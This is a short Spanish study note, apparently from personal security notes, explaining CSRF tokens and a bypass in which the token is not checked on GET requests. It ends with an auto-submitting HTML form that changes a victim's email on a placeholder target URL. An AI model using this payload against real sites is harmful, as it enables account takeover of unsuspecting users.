## Que es un Token csrf

Un token CSRF no es mas que un código único para cada sesión de usuario, este se usa para evitar que los atacantes puedan realizar este tipo de ataques, ya que se necesita de este token para poder procesar las peticiones correctamente 

## Ataque

En algunos casos el token CSRF no se revisa cuando el método de la petición no es POST, para entender esto tenemos que tener en cuenta que tanto con  GET y POST  se peuden enviar datos, solo que la estructura es diferente, esto se explica en [[3- Envío de datos en peticiones]], el punto es que como en GET enviamos el token csrf en la URL pues no es procesado, esto puede hacer que pongamos cualquier cosa, nuestro servidor como atacantes quedaría algo así:

```html
<form method="GET" action="{URL_PAGINA_VICTIMA}">
	<input type="hidden" name="email" value="newemail@new.com">
</form>
<script>
	document.forms[0].submit()
</script>
```


